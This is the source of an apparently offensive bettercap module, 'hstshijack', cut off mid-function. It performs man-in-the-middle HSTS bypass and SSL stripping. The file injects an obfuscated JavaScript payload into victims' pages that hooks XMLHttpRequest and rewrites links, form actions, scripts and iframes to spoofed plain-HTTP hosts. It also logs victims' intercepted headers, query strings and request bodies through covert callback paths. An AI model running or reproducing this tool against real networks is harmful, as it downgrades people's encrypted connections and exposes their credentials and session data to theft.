
/* Declare variables */

var ssl_log = [],
    whitelist = {}

var payload,
    payload_container = new String(
    	"if (!self.{{SESSION_ID_TAG}}) {\n" + 
    	"	self.{{SESSION_ID_TAG}} = function() {\n" + 
    	"		var obf_var_callback_log_121737 = [];\n" + 
    	"		function obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\")\n" + 
    	"			return [\n" + 
    	"				new RegExp(\"^\" + obf_var_selector_string_121737 + \"$\", \"ig\"),\n" + 
    	"				obf_var_replacement_string_121737\n" + 
    	"			]\n" + 
    	"		}\n" + 
    	"		function obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\")\n" + 
    	"			if ( obf_var_selector_string_121737.match(/^\\*./) ) {\n" + 
    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/^\\*\\./, \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\")\n" + 
    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/^\\*\\./, \"\")\n" + 
    	"				return [\n" + 
    	"					new RegExp(\"^\" + obf_var_selector_string_121737 + \"$\", \"ig\"),\n" + 
    	"					\"$1\" + obf_var_replacement_string_121737\n" + 
    	"				]\n" + 
    	"			} else if ( obf_var_selector_string_121737.match(/\\.\\*$/) ) {\n" + 
    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\.\\*/g, \"((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)\")\n" + 
    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/\\.\\*$/, \"\")\n" + 
    	"				return [\n" + 
    	"					new RegExp(obf_var_selector_string_121737, \"ig\"),\n" + 
    	"					obf_var_replacement_string_121737 + \"$1\"\n" + 
    	"				]\n" + 
    	"			}\n" + 
    	"		}\n" + 
    	"		function obf_func_toWholeRegexpSet_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
    	"			if ( obf_var_selector_string_121737.indexOf(\"*\") != -1 ) {\n" + 
    	"				return obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)			\n" + 
    	"			} else {\n" + 
    	"				return obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)\n" + 
    	"			}\n" + 
    	"		}\n" + 
    	"		{{VARIABLES_TAG}}\n" + 
    	"		function obf_func_hstshijack_121737(obf_host_121737) {\n" + 
    	"			for (obf_var_i_121737 = 0; obf_var_i_121737 < obf_var_target_hosts.length; obf_var_i_121737++) {\n" + 
    	"				obf_var_whole_regexp_set_121737 = obf_func_toWholeRegexpSet_121737(obf_var_target_hosts[obf_var_i_121737], obf_var_replacement_hosts[obf_var_i_121737]);\n" + 
    	"				if (obf_host_121737.match(obf_var_whole_regexp_set_121737[0])) {\n" + 
    	"					obf_host_121737 = obf_host_121737.replace(obf_var_whole_regexp_set_121737[0], obf_var_whole_regexp_set_121737[1]);\n" + 
    	"					break;\n" + 
    	"				}\n" + 
    	"			}\n" + 
    	"			return obf_host_121737;\n" + 
    	"		}\n" + 
    	"		function obf_func_attack_XMLHttpRequest_121737() {\n" + 
    	"			var obf_func_open_121737 = XMLHttpRequest.prototype.open;\n" + 
    	"			XMLHttpRequest.prototype.open = function(obf_var_method_121737, obf_var_url_121737, obf_var_async_121737, obf_var_username_121737, obf_var_password_121737) {\n" + 
    	"				obf_var_host_121737 = obf_func_hstshijack_121737(obf_var_url_121737.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));\n" + 
    	"				obf_var_path_121737 = obf_var_url_121737.replace(/^(?:http[s]?:\\/\\/[^:/?#]*)?([:/?#].*$)/, \"$1\");\n" + 
    	"				obf_var_url_121737 = \"http://\" + obf_var_host_121737 + obf_var_path_121737;\n" + 
    	"				return obf_func_open_121737.apply(this, arguments);\n" + 
    	"			}\n" + 
    	"		}\n" + 
    	"		function obf_func_callback_121737(obf_var_data_121737) {\n" + 
    	"			obf_var_req_121737 = new XMLHttpRequest();\n" + 
    	"			obf_var_req_121737.open(\"GET\", \"http://\" + location.host + \"/obf_path_ssl_log?\" + obf_var_data_121737, true);\n" + 
    	"			obf_var_req_121737.send();\n" + 
    	"		}\n" + 
    	"		function obf_func_attack_121737() {\n" + 
    	"			try {\n" + 
    	"				obf_var_regexp_121737 = new RegExp(\"http[s]?:\\\\/\\\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\\\.)+(?:[a-z]{1,63}))\", \"ig\");\n" + 
    	"				obf_var_urls_121737 = document.body.innerHTML.match(obf_var_regexp_121737);\n" + 
    	"				for (var obf_var_i_121737 = 0; obf_var_i_121737 < obf_var_urls_121737.length; obf_var_i_121737++) {\n" + 
    	"					obf_var_host_121737 = obf_var_urls_121737[obf_var_i_121737].replace(obf_var_regexp_121737, \"\");\n" + 
    	"					if (obf_var_callback_log_121737.indexOf(obf_var_host_121737) == -1) {\n" + 
    	"						obf_func_callback_121737(btoa(obf_var_host_121737));\n" + 
    	"						obf_var_callback_log_121737.push(obf_var_host_121737);\n" + 
    	"					}\n" + 
    	"				}\n" + 
    	"			} catch(obf_var_ignore_121737){}\n" + 
    	"			try {\n" + 
    	"				document.querySelectorAll(\"a,form,script,iframe\").forEach(function(obf_var_node_121737){\n" + 
    	"					obf_var_url_121737 = \"\";\n" + 
    	"					switch (obf_var_node_121737.tagName) {\n" + 
    	"						case \"A\": obf_var_node_121737.href ? obf_var_url_121737 = obf_var_node_121737.href : \"\"; break;\n" + 
    	"						case \"FORM\": obf_var_node_121737.action ? obf_var_url_121737 = obf_var_node_121737.action : \"\"; break;\n" + 
    	"						case \"SCRIPT\": obf_var_node_121737.src ? obf_var_url_121737 = obf_var_node_121737.src : \"\"; break;\n" + 
    	"						case \"IFRAME\": obf_var_node_121737.src ? obf_var_url_121737 = obf_var_node_121737.src : \"\"; break;\n" + 
    	"					}\n" + 
    	"					if (obf_var_url_121737.match(/^http[s]?:\\/\\/(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{1,63}(?:[:/?#].*$)?/i)) {\n" + 
    	"						obf_var_path_121737 = obf_var_url_121737.replace(/^http[s]?:\\/\\/[^:/?#]+([:/?#].*$)?/i, \"$1\");\n" + 
    	"						obf_var_host_121737 = obf_func_hstshijack_121737(obf_var_url_121737.replace(/^http[s]?:\\/\\/([^:/?#]+).*/i, \"$1\"));\n" + 
    	"						switch (obf_var_node_121737.tagName) {\n" + 
    	"							case \"A\": obf_var_node_121737.href ? obf_var_node_121737.href = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
    	"							case \"FORM\": obf_var_node_121737.action ? obf_var_node_121737.action = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
    	"							case \"SCRIPT\": obf_var_node_121737.src ? obf_var_node_121737.src = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
    	"							case \"IFRAME\": obf_var_node_121737.src ? obf_var_node_121737.src = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
    	"						}\n" + 
    	"					}\n" + 
    	"				});\n" + 
    	"			} catch(obf_var_ignore_121737){}\n" + 
    	"		}\n" + 
        "		obf_func_attack_XMLHttpRequest_121737();\n" + 
    	"		setInterval(function(){\n" + 
    	"			obf_func_attack_121737();\n" + 
    	"		}, 666);\n" + 
    	"		try {\n" + 
    	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_121737);\n" + 
    	"		} catch(obf_var_ignore_121737){\n" + 
    	"			self.addEventListener(\"load\", obf_func_attack_121737);\n" + 
    	"		}\n" + 
    	"		obf_func_attack_121737();\n" + 
    	"		{{CUSTOM_PAYLOAD_TAG}}\n" + 
    	"	}\n" + 
    	"	self.{{SESSION_ID_TAG}}();\n" + 
    	"}\n")

var ignore_hosts       = [],
    target_hosts       = [],
    replacement_hosts  = [],
    block_script_hosts = [],
    payloads

var obfuscate

var callback_path,
    whitelist_path,
    ssl_log_path,
    session_id,
    var_target_hosts,
    var_replacement_hosts

var math_seed

var red      = "\033[31m",
    yellow   = "\033[33m",
    green    = "\033[32m",
    blue     = "\033[34m",
    on_white = "\033[47;30m",
    on_grey  = "\033[40;37m",
    on_blue  = "\033[104;30m",
    bold     = "\033[1;37m",
    reset    = "\033[0m"

/* Declare functions */

function randomFloat() {
	r = Math.sin(math_seed++) * 10000
	return r - Math.floor(r)
}

function randomString(length) {
	var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
	    buff  = ""
	while (buff.length < length) {
		index = parseInt( Math.random() * chars.length )
		buff = buff + chars.charAt(index)
	}
	return buff
}

function toRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(/\./g, "\\.")
	selector_string = selector_string.replace(/\-/g, "\\-")
	return [
		new RegExp("([^a-z0-9-.]|^)" + selector_string + "([^a-z0-9-.]|$)", "ig"),
		"$1" + replacement_string + "$2"
	]
}

function toWholeRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(/\./g, "\\.")
	selector_string = selector_string.replace(/\-/g, "\\-")
	return [
		new RegExp("^" + selector_string + "$", "ig"),
		replacement_string
	]
}

function toWildcardRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(/\-/g, "\\-")
	if ( selector_string.match(/^\*./) ) {
		selector_string = selector_string.replace(/^\*\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)")
		selector_string = selector_string.replace(/\./g, "\\.")
		replacement_string = replacement_string.replace(/^\*\./, "")
		return [
			new RegExp(selector_string, "ig"),
			"$1" + replacement_string
		]
	} else if ( selector_string.match(/\.\*$/) ) {
		selector_string = selector_string.replace(/\.\*$/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)")
		selector_string = selector_string.replace(/\./g, "\\.")
		replacement_string = replacement_string.replace(/\.\*$/, "")
		return [
			new RegExp(selector_string, "ig"),
			replacement_string + "$1"
		]
	} else {
		log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardRegexp() value (got " + selector_string + ").")
	}
}

function toWholeWildcardRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(/\-/g, "\\-")
	if ( selector_string.match(/^\*./) ) {
		selector_string = selector_string.replace(/^\*\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)")
		selector_string = selector_string.replace(/\./g, "\\.")
		replacement_string = replacement_string.replace(/^\*\./, "")
		return [
			new RegExp("^" + selector_string + "$", "ig"),
			"$1" + replacement_string
		]
	} else if ( selector_string.match(/\.\*$/) ) {
		selector_string = selector_string.replace(/\.\*/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)")
		selector_string = selector_string.replace(/\./g, "\\.")
		replacement_string = replacement_string.replace(/\.\*$/, "")
		return [
			new RegExp(selector_string, "ig"),
			replacement_string + "$1"
		]
	} else {
		log_error(on_blue + "hstshijack" + reset + " Invalid toWholeWildcardRegexp() value (got " + selector_string + ").")
	}
}

// Matches (^|[^a-zA-Z0-9-.])example.com($|[^a-zA-Z0-9-.])
function toRegexpSet(selector_string, replacement_string) {
	if ( selector_string.indexOf("*") != -1 ) {
		return toWildcardRegexp(selector_string, replacement_string)
	} else {
		return toRegexp(selector_string, replacement_string)
	}
}

// Matches ^example.com$
function toWholeRegexpSet(selector_string, replacement_string) {
	if ( selector_string.indexOf("*") != -1 ) {
		return toWholeWildcardRegexp(selector_string, replacement_string)			
	} else {
		return toWholeRegexp(selector_string, replacement_string)
	}
}

function configure() {
	// Read caplet.
	env["hstshijack.ignore"]       ? ignore_hosts       = env["hstshijack.ignore"].replace(/\s/g, "").split(",")       : ignore_hosts       = []
	env["hstshijack.targets"]      ? target_hosts       = env["hstshijack.targets"].replace(/\s/g, "").split(",")      : target_hosts       = []
	env["hstshijack.replacements"] ? replacement_hosts  = env["hstshijack.replacements"].replace(/\s/g, "").split(",") : replacement_hosts  = []
	env["hstshijack.blockscripts"] ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",") : block_script_hosts = []
	env["hstshijack.payloads"]     ? payloads           = env["hstshijack.payloads"].replace(/\s/g, "").split(",")     : payloads           = []
	env["hstshijack.obfuscate"]    ? obfuscate          = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase() : obfuscate          = false

	// Validate caplet.
	target_hosts.length < replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").")   : ""
	target_hosts.length > replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
	target_hosts.indexOf("*")      != -1 ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).")      : ""
	replacement_hosts.indexOf("*") != -1 ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).") : ""
	for (var i = 0; i < ignore_hosts.length; i++) {
		!ignore_hosts[i].match(/^\*$/i) 
		&& !ignore_hosts[i].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i) 
		&& !ignore_hosts[i].match(/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i) 
		? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[i] + ").") 
		: ""
	}
	for (var i = 0; i < target_hosts.length; i++) {
		!target_hosts[i].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i) 
		&& !target_hosts[i].match(/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i) 
		? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[i] + ").") 
		: ""
		!replacement_hosts[i].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i) 
		&& !replacement_hosts[i].match(/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i) 
		? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[i] + ").") 
		: ""
		if (target_hosts[i].match(/\*/g) || replacement_hosts[i].match(/\*/g)) {
			target_host_wildcard_count      = target_hosts[i].match(/\*/g).length      || 0
			replacement_host_wildcard_count = replacement_hosts[i].match(/\*/g).length || 0
			if (target_host_wildcard_count != replacement_host_wildcard_count) {
				log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets or hstshijack.replacements value, wildcards do not match (got " + target_hosts[i] + " and " + replacement_hosts[i] + ").")
			}
		}
	}
	for (var i = 0; i < block_script_hosts.length; i++) {
		!block_script_hosts[i].match(/^\*$/i) 
		&& !block_script_hosts[i].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i) 
		&& !block_script_hosts[i].match(/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i) 
		? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") 
		: ""
	}
	if (obfuscate == "true") {
		obfuscate = true
	} else {
		obfuscate = false
	}
	// Preload custom payloads.
	p = {}
	for (var a = 0; a < payloads.length; a++) {
		!payloads[a].match(/^\*:.+$/i) 
		&& !payloads[a].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i) 
		&& !payloads[a].match(/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i) 
		? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payloads[a] + ").")
		: ""

		payload_host = payloads[a].replace(/[:].*/, "")
		payload_path = payloads[a].replace(/.*[:]/, "")

		if ( !readFile(payload_path) ) {
			log_error(on_blue + "hstshijack" + reset + " Could not read a payload_path in hstshijack.payloads (got " + payload_path + ").")
		} else {
			this_payload = readFile(payload_path).replace(/obf_path_whitelist/g, whitelist_path).replace(/obf_path_callback/g, callback_path)

			if (obfuscate) {
				obfuscation_variables = this_payload.match(/obf_[a-z0-9_]*/ig) || []
				for (var b = 0; b < obfuscation_variables.length; b++) {
					regexp = new RegExp(obfuscation_variables[b], "g")
					this_payload = this_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
				}
			}

			if (p[payload_host]) {
				p[payload_host] = { "payload": p[payload_host].payload + "\n" + this_payload }
			} else {
				p[payload_host] = { "payload": this_payload }
			}
		}
	}
	payloads = p
	// Prepare core payload.
	payload = payload_container.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id)
	payload = payload.replace("obf_path_whitelist", whitelist_path)
	payload = payload.replace("obf_path_callback", callback_path)
	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
	payload = payload.replace( "{{VARIABLES_TAG}}", "{{VARIABLES_TAG}}\n		var " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]" )
	payload = payload.replace( "{{VARIABLES_TAG}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
	// Obfuscate core payload.
	if (obfuscate) {
		obfuscation_variables = payload.match(/obf_[a-z0-9_]*/ig) || []
		for (var i = 0; i < obfuscation_variables.length; i++) {
			regexp = new RegExp(obfuscation_variables[i], "g")
			payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
		}
	}

	// Ensure targeted hosts are in SSL log.
	for (var i = 0; i < target_hosts.length; i++) {
		target = target_hosts[i]
		if ( !target.match(/\*/) ) {
			if ( ssl_log.indexOf(target) == -1 ) {
				ssl_log.push(target)
				writeFile( env["hstshijack.log"], ssl_log.join("\n") )
				env["hstshijack.log"] ? log_debug(on_blue + "hstshijack" + reset + " Saved " + target + " to SSL log.") : ""
			}
		}
	}
}

function showConfig() {
	// Print module information on screen
	logStr  = "\n"
	logStr += "  " + bold + "Commands" + reset + "\n"
	logStr += "\n"
	logStr += "    " + bold + "hstshijack.show" + reset + " : Show module info.\n"
	logStr += "\n"
	logStr += "  " + bold + "Caplet" + reset + "\n"
	logStr += "\n"
	logStr += "    " + yellow + "           hstshijack.log" + reset + " > " + ( env["hstshijack.log"] ? green + env["hstshijack.log"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "        hstshijack.ignore" + reset + " > " + ( env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "       hstshijack.targets" + reset + " > " + ( env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "     hstshijack.obfuscate" + reset + " > " + ( obfuscate ? green + "true" : red + "false" ) + reset + "\n"
	logStr += "    " + yellow + "      hstshijack.payloads" + reset + " > "
	if ( env["hstshijack.payloads"] ) {
			list = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
			logStr += green + list[0] + reset + "\n"
			if (list.length > 1) {
				for ( var i = 0; i < (list.length-1); i++ ) {
					logStr += "                              > " + green + list[i+1] + reset + "\n"
				}
			}
	} else {
		logStr += red + "undefined" + reset + "\n"
	}
	logStr += "\n"
	logStr += "  " + bold + "Session info" + reset + "\n"
	logStr += "\n"
	logStr += "    " + bold + "     Session ID" + reset + " : " + session_id + "\n"
	logStr += "    " + bold + "  Callback Path" + reset + " : /" + callback_path + "\n"
	logStr += "    " + bold + " Whitelist Path" + reset + " : /" + whitelist_path + "\n"
	logStr += "    " + bold + "   SSL Log Path" + reset + " : /" + ssl_log_path + "\n"
	logStr += "    " + bold + "        SSL Log" + reset + " : " + ssl_log.length + " host" + (ssl_log.length == 1 ? "" : "s") + "\n"
	console.log(logStr)
}

function onCommand(cmd) {
	if (cmd == "hstshijack.show") {
		showConfig()
		return true
	}
}

function onLoad() {
	math_seed = new Date().getMilliseconds()
	Math.random = function() { return randomFloat() }

	log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...")
	session_id            = randomString( 4 + Math.random() * 12 )
	callback_path         = randomString( 4 + Math.random() * 12 )
	whitelist_path        = randomString( 4 + Math.random() * 12 )
	ssl_log_path          = randomString( 4 + Math.random() * 12 )
	var_target_hosts      = randomString( 4 + Math.random() * 12 )
	var_replacement_hosts = randomString( 4 + Math.random() * 12 )

	log_info(on_blue + "hstshijack" + reset + " Reading SSL log ...")
	if ( !readFile( env["hstshijack.log"] ) ) {
		log_info(on_blue + "hstshijack" + reset + " No SSL log file found, creating one now ...")
		writeFile(env["hstshijack.log"], "")
	}
	ssl_log = readFile( env["hstshijack.log"] ).split("\n")

	log_info(on_blue + "hstshijack" + reset + " Reading caplet ...")
	configure()
	log_info(on_blue + "hstshijack" + reset + " Module loaded.")
	showConfig()
}

function onRequest(req, res) {

	ignored = false

/* Handle special callbacks */

	if (req.Path == "/" + callback_path || req.Path == "/" + whitelist_path || req.Path == "/" + ssl_log_path) {

		// SSL log callback
		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
		if (req.Path == "/" + ssl_log_path) {
			queried_host = atob(req.Query)
			if ( ssl_log.indexOf(queried_host) == -1 ) {
				log_debug(on_blue + "hstshijack" + reset + " Learning HTTP response from " + queried_host + " ...")
				req.Hostname = queried_host
				req.Path     = "/"
				req.Query    = ""
				req.Body     = ""
				req.Method   = "HEAD"
			}
			log_debug(on_blue + "hstshijack" + reset + " Silent SSL log callback received from " + green + req.Client.IP + reset + " for " + bold + queried_host + reset + ".")
		}

		// Basic callback
		// Requests made for this path will print sniffed data.
		// Requests made for this path will not be proxied.
		if (req.Path == "/" + callback_path) {
			log_info(on_blue + "hstshijack" + reset + " Silent callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset)

			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"

			logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n"
			headers = req.Headers.split("\r\n")
			for (var i = 0; i < headers.length; i++) {
				if ( headers[i].split(": ").length == 2 ) {
					params = headers[i].split(": ")
					logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
				} else {
					logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n"
				}
			}

			logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n"
			queries = req.Query.split("&")
			for (var i = 0; i < queries.length; i++) {
				if ( queries[i].split("=").length == 2 ) {
					params = queries[i].split("=")
					logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
				} else {
					logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n"
				}
			}

			logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"

			console.log(logStr)

			req.Scheme = "ignore"
		}

		// Whitelist callback
		// Requests made for this path will print sniffed data.
		// Requests made for this path will not be proxied.
		// Requests made for this path will stop all attacks towards this client for the requested hostname.
		if (req.Path == "/" + whitelist_path) {
			log_info(on_blue + "hstshijack" + reset + " Silent, whitelisting callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset)

			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"

			logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n"
			headers = req.Headers.split("\n")
			for (var i = 0; i < headers.length; i++) {
				if ( headers[i].split(": ").length == 2 ) {
					params = headers[i].split(": ")
					logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
				} else {
					logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n"
				}
			}

			logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n"
			queries = req.Query.split("&")
			for (var i = 0; i < queries.length; i++) {
				if ( queries[i].split("=").length == 2 ) {
					params = queries[i].split("=")
					logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
				} else {
					logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n"
				}
			}

			logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"

			console.log(logStr)

			req.Scheme = "ignore"
			// Add requested hostname (spoofed and/or original) to whitelist
			if (whitelist[req.Client.IP]) {
				whitelisted_hosts = whitelist[req.Client.IP].split(",")
				if ( whitelisted_hosts.indexOf(req.Hostname) == -1 ) {
					whitelisted_hosts += "," + req.Hostname
				}
			} else {
				whitelist[req.Client.IP] = req.Hostname
			}
			// Also add (wildcard) targets and replacements for requested hostname
			for (var i = 0; i < target_hosts.length; i++) {
				whole_target_selector = toWholeRegexpSet(target_hosts[i], "")[0]
				whole_replacement_selector = toWholeRegexpSet(replacement_hosts[i], "")[0]
				if ( req.Hostname.match(whole_target_selector) || req.Hostname.match(whole_replacement_selector) ) {
					whitelist[req.Client.IP] += "," + replacement_hosts[i]
					whitelist[req.Client.IP] += "," + target_hosts[i]
					break
				}
			}
		}

	} else {

	/* Attack or ignore request */

		// Redirect client to the real host if a whitelist callback was received.
		if (whitelist[req.Client.IP]) {
			whitelisted_hosts = whitelist[req.Client.IP].split(",")
			for (var a = 0; a < whitelisted_hosts.length; a++) {
				whole_regexp_set = toWholeRegexpSet(whitelisted_hosts[a], "")
				if ( req.Hostname.match(whole_regexp_set[0]) ) {
					// Restore requested hostname if it was spoofed
					var unspoofed_host
					for (var b = 0; b < replacement_hosts.length; b++) {
						whole_regexp_set = toWholeRegexpSet(replacement_hosts[b], target_hosts[b])
						if ( req.Hostname.match(whole_regexp_set[0]) ) {
							unspoofed_host = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1])
							res.SetHeader( "Location", "https://" + unspoofed_host + req.Path + ( req.Query != "" ? ("?" + req.Query) : "" ) )
							res.Status = 301
							break
						}
					}
					res.SetHeader("bettercap", "ignore")
					ignored = true
					log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.IP + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelist callback.")
					break
				}
			}
		}

		if (!ignored) {

		/* Patch Request */

			// Patch spoofed hostnames.
			for (var a = 0; a < target_hosts.length; a++) {

				// Patch spoofed hostnames in headers.
				regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a])
				if ( req.Headers.match(regexp_set[0]) ) {
					req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1])
					log_debug(on_blue + "hstshijack" + reset + " Patched spoofed hostname(s) in request header(s).")
				}

				// Patch spoofed hostname of request.
				whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a])
				if ( req.Hostname.match(whole_regexp_set[0]) ) {
					spoofed_host = req.Hostname
					req.Hostname = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1])
					req.Scheme   = "https"
					log_debug(on_blue + "hstshijack" + reset + " Patched spoofed hostname " + bold + spoofed_host + reset + " to " + bold + req.Hostname + reset + " and set scheme to HTTPS.")
				}

				if ( req.Headers.match(regexp_set[0]) || req.Hostname.match(whole_regexp_set[0]) ) {
					break
				}
			}

			// Patch SSL in headers if we know host uses SSL.
